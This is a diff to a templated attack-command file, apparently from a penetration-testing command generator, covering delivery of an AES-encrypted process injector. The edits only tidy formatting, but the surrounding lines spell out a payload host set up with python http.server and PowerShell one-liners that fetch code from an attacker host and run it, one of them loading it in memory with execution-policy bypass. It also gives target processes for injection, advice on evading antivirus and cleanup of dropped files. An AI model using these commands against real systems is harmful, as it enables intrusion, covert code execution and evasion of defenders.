@@ -132,7 +132,7 @@ output:
     ```bash
     python3 -m http.server 80
     ```
-    
+
     **Target:**
     ```powershell
     powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} {{ target_process }}"
@@ -144,7 +144,7 @@ output:
     ```bash
     python3 -m http.server 80
     ```
-    
+
     **Target:**
     ```powershell
     powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [AESInjector.Program]::Main(@('{{ target_process }}'))"
@@ -159,7 +159,7 @@ output:
     - Requires matching architecture (x64 binary → x64 process)
     - May require administrative privileges depending on target process integrity level
 
-    Troubleshooting:
+    # Troubleshooting:
     - Injection fails: Verify target process running with `tasklist | findstr {{ target_process }}`
     - Process not found: Try alternative targets (notepad.exe, explorer.exe, chrome.exe)
     - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
@@ -167,6 +167,8 @@ output:
     - AV detection: AES helps but may still be caught; consider additional obfuscation
     - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
 
-    Cleanup:
+    # Cleanup:
     On target:
-    $ del {{ output_file }}
+    ```powershell
+    del {{ output_file }}
+    ```
